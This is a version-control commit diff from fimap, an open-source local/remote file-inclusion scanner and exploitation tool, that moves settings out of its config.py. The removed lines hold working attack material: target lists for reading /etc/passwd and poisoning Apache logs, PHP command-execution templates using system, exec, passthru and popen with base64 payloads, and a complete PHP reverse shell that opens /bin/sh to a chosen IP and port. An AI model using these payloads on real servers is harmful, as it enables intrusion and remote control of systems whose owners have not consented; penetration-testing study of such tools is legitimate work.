9acae2acf79a9cfd8d98440d7e02ba0267682531
fimap.dev <fimap.dev@73730ac2-96f3-11de-85ac-4b769f26a8fe>
2010-02-02 13:19:35 +0000

    Preparing Multilanguage scanning and attacking. (This rev is broken on purpose.)

--- trunk/src/config.py
+++ trunk/src/config.py
@@ -18,7 +18,7 @@
 # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 #
 
-
+import language
 
 __author__="Iman Karim(ikarim2s@smail.inf.fh-brs.de)"
 __date__ ="$01.09.2009 13:56:47$"
@@ -54,92 +54,6 @@ settings["dynamic_rfi"]["local"]["http_map"]   = None   # The http url of the fi
                                                         # if you are using this tool you already know it ;)
 
 
-
-
-# Files you want to scan for.
-# There are 3 types of files you can define:
-# - "files"     are the default files which can be reached relative.
-#               Example: /etc/passwd
-# - "filesabs"  are absolute only filepathes. Those which can't be reached in a relative way.
-#               Example: php://input
-# - "filesrmt"  are remote files to check them.
-#
-# All files you define should be defined in arrays. The first item should
-# be the filepath itself. The second one should be a string which is in the file.
-# The thrid option is a string of flags. The following flags can be used:
-# (r)ead ; e(x)ecute ; executable by User-(A)gent ; executable by (P)ost ; (R)emote executable
-# Example Array 1 : ("/etc/passwd", "root:", None, "r")
-#                                             # [0] Check the file "/etc/passwd".
-#                                             # [1] The file should contain "root:".
-#                                             # [2] Send nothing thru POST.
-                                              # [3] The file is (r)eadonly -> for testing only.
-# Example Array 2 : ("php://input", "__PHP_ANSWER__", "<?php __PHP_QUIZ__ ?>", "rxP")
-#                                             # [0] Check the file "php://input".
-#                                             # [1] Test if the automaticly generated PHP answer is correct.
-#                                             # [2] Create an automatic randomized PHP testing code and send it thru POST.
-#                                             # [3] The file is (r)eadable and injectable\e(x)ecutable by (P)OST.
-# Example Array 3 : ("/proc/self/environ", "HTTP_USER_AGENT=", None, "rxA")
-#                                             # [0] Check the file "/proc/self/environ".
-#                                             # [1] The file should contain "HTTP_USER_AGENT=".
-                                              # [2] Send nothing thru POST.
-#                                             # [3] The file is (r)eadable and injectable\e(x)ecutable by User-(A)gent.
-#
-# If NULL-Byte Poisoning is possible, fimap will automaticly try to modify the path for you.
-# If it's not available, fimap will try those files which have the same ending characters like the forced suffix
-#
-# All files here should be defined as absolute files. fimap will automaticly relative them if needed.
-settings["files"] = (
-                        ("/etc/passwd", "root:", None, "r"),
-                        ("/proc/self/environ", "HTTP_USER_AGENT=", None, "rxA"),
-                    )
-                     # Possible more if you want. (No Logfiles! Logfiles for Loginjection is below!)
-
-# Files which can't be relativized. These pathes can only work if we have a
-# clean injection.
-# Works also if:
-#   - Is dirty but has working NullByte-Injection
-#   - If the appendix of the include vector has the same ending as our file.
-# In both cases it have to be an absolute path.
-# fimap will check every case for you.
-settings["filesabs"] = (("php://input", "__PHP_ANSWER__", "<?php __PHP_QUIZ__ ?>", "rxP"),)
-
-# Remote file inclusion test (Not needed if you use dynamic_rfi).
-# Remote files have no possibility to send POST requests. (No Need IMO)
-settings["filesrmt"] = (
-                          (     # Test for remote inclusion and for dirty urls with suffix .php
-                                "http://www.phpbb.de/index.php", 
-                                "Willkommen auf phpBB.de",
-                                "rR" # (r)ead-flag and (R)emoteInjection-Flag
-                          ),
-                          (     # Same as above for urls with suffix .html
-                                "http://www.uni-bonn.de/Frauengeschichte/index.html",
-                                "Frauengeschichte an der Universit",
-                                "rR" # (r)ead-flag and (R)emoteInjection-Flag
-                          ),
-                          (
-                                # ... .htm
-                                "http://www.kah-bonn.de/index.htm?presse/winterthur.htm",
-                                "Das Programm der Kunst- und Ausstellungshalle basiert",
-                                "rR" # (r)ead-flag and (R)emoteInjection-Flag
-                          )
-                       )
-
-# Logfiles!
-# Also no POST requests possible here. (No need too IMO)
-settings["fileslog"] = (
-                         ("/var/log/apache2/access.log", "\"GET /", "LHx"), # (L)og Flag + (H)TTP Useragent injection.
-                         ("/var/log/apache/access.log", "\"GET /", "LHx"),
-                         ("/var/log/httpd/access.log", "\"GET /", "LHx"),
-                         ("/var/log/apache2/access_log", "\"GET /", "LHx"),
-                         ("/var/log/apache/access_log", "\"GET /", "LHx"),
-                         ("/var/log/httpd/access_log", "\"GET /", "LHx"),
-                         ("/var/log/lighttpd/access.log", "\"GET /", "LHx"),
-
-                         #("/var/log/secure", None, "LFx"), # (L)og Flag + (F)TP Username injection. (Not supported right now)
-                         #("/var/log/messages", None, "LFx") # (L)og Flag + (F)TP Username injection.
-                         # As much as you want here.
-                       )
-
 # Blindmode settings. Only used if you enable blind scanning.
 settings["blind"] = {}
 settings["blind"]["minlevel"] = 0             # How many ../ are the minimum count to test?
@@ -154,75 +68,4 @@ settings["blind"]["files"] = (
                                 ("/etc/passwd", "root:", None),
                              )
 
-# Distribution files which can give us infos about the distribution.
-settings["distfiles"]= ("/etc/debian_version", "/etc/redhat-release", "/etc/gentoo-release")
-
-# CMD to test if PHP injection works and a string which should be found if it was successfull.
-settings["php_info"] = ("<? __PHP_QUIZ__ ?>", "__PHP_ANSWER__")
-
-# Shell test. The command which should be executed and the result of it to test if the php_exec stuff below works.
-# Big thanks to exorzist@freenet.de for this much greater shell test! He is an excellent coder. Believe me.
-settings["shell_test"] = ("__SHELL_QUIZ__", "__SHELL_ANSWER__")
-
-# PHP Execution Methods. Methods to execute system commands on the exploitable system. 
-# In best case it should echo all stuff back to us.
-# __PAYLOAD__ will be replaces by the actual command. Also it will be base64 encoded! So don't forget to decode it!
-settings["php_exec"]=[]
-settings["php_exec"].append(("popen","<? $h=popen(base64_decode(\"__PAYLOAD__\") . \" 2>&1\", \"r\");while(!feof($h)){$l=fread($h, 2024);echo $l;}?>"))
-settings["php_exec"].append(("passthru", "<? passthru (base64_decode(\"__PAYLOAD__\"). \" 2>&1\"); ?>"))
-settings["php_exec"].append(("exec", "<? echo exec (base64_decode(\"__PAYLOAD__\"). \" 2>&1\"); ?>"))
-settings["php_exec"].append(("system", "<? system (base64_decode(\"__PAYLOAD__\"). \" 2>&1\"); ?>"))
-
-
-settings["payloads"] = {}
-settings["payloads"]["sys"] = {}
-settings["payloads"]["php"] = {}
-
-# Reverse Shell Code - I have enlighted it.
-# Orginal credit goes to:
-# php-reverse-shell - A Reverse Shell implementation in PHP
-# Copyright (C) 2007 pentestmonkey@pentestmonkey.net
-settings["payloads"]["php"]["Spawn reverse shell"] = (
-                                                       (("IP where the reverse shell should connect to: ", "__IP__"),
-                                                       ("Port where the shell should connect to: ","__PORT__"),
-                                                       ("Make your netcat server ready and press enter!", "__NULL__")),
-                                                       "<?php set_time_limit (0);$VERSION = \"1.0\";$ip = \"__IP__\";$port = __PORT__;$chunk_size = 1400;$write_a = null;$error_a = null;$shell = \"uname -a; w; id; /bin/sh -i\";$daemon = 0;$debug = 0;if (function_exists(\"pcntl_fork\")) { $pid = pcntl_fork();if ($pid == -1) { printit(\"ERROR: Cant fork\");exit(1);} if ($pid) { exit(0);} if (posix_setsid() == -1) { printit(\"Error: Cant setsid()\");exit(1);} $daemon = 1;} else {printit(\"WARNING: Failed to daemonise.This is quite common and not fatal.\");}chdir(\"/\");umask(0);$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) { printit(\"$errstr ($errno)\");exit(1);}$descriptorspec = array( 0 => array(\"pipe\", \"r\"), 1 => array(\"pipe\", \"w\"), 2 => array(\"pipe\", \"w\"));$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) {printit(\"ERROR: Cant spawn shell\"); exit(1);}stream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit(\"Successfully opened reverse shell to $ip:$port\");while (1) {if (feof($sock)) {printit(\"ERROR: Shell connection terminated\");break;} if (feof($pipes[1])) {printit(\"ERROR: Shell process terminated\"); break;} $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);if (in_array($sock, $read_a)) { if ($debug) printit(\"SOCK READ\"); $input = fread($sock, $chunk_size); if ($debug) printit(\"SOCK: $input\");fwrite($pipes[0], $input);} if (in_array($pipes[1], $read_a)) { if ($debug) printit(\"STDOUT READ\"); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\"STDOUT: $input\");fwrite($sock, $input);} if (in_array($pipes[2], $read_a)) { if ($debug) printit(\"STDERR READ\"); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\"STDERR: $input\");fwrite($sock, $input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit ($string) { if (!$daemon) { print \"$string\n\";}}?>"
-                                                     )
-
-
-# Your custom payloads!
-# You can define here some payloads which you want to see in the exploit (-x) menu!
-# There are two categorys of payloads. "sys" payloads and "php" payloads.
-# fimap will check if he can execute php stuff. It it was successfull he will
-# check if he can run system commands thru php.
-# Based on the results, your payloads will be visible or not.
-
-# Some custom payload examples:
-
-# Payloads which can *only* be executed in a 'bash':
-#                      |||    Attack Name
-#                      |||    |||||||||||
-#                      vvv    vvvvvvvvvvv
-#settings["payloads"]["sys"]["Read a file"] = (
-#                                               (("Filepath to read: ", "__FILE__"),),    # Question(s) and placeholder for user inputs.
-#                                               "cat '__FILE__'"                          # Command to execute with your placeholder(s).
-#                                             )
-
-#settings["payloads"]["sys"]["Something without Question"] = (
-#                                               None,                 # No Question
-#                                               "eject"               # Command to execute.
-#                                             )
-
-
-# Payloads which are   PHP code. REMEMBER: You shouldn't use exec() or system() or stuff like that in the php code to be sure it will run correctly.
-#                      |||    AttackName
-#                      |||    ||||||||||
-#                      vvv    vvvvvvvvvv
-#settings["payloads"]["php"]["Write File"] = (
-#                                                (("Filepath to write: ", "__FILE__"),    # Question Number One with its Placeholder for its answer.
-#                                                ("File content: ", "__CONTENT__")),       # Question Number Two with its Placeholder for its answer.
-#                                                "<? $f=fopen(\"__FILE__\", \"w\"); fwrite($f, \"__CONTENT__\"); fclose($f); ?>"  # The PHP Code itself.
-#                                             )
-
-# There is no maximum count of questions you can define.
-# Because the userinput is base64 encoded you can use quotes now as much as you want.
+xmlsettings = language.XML2Config()
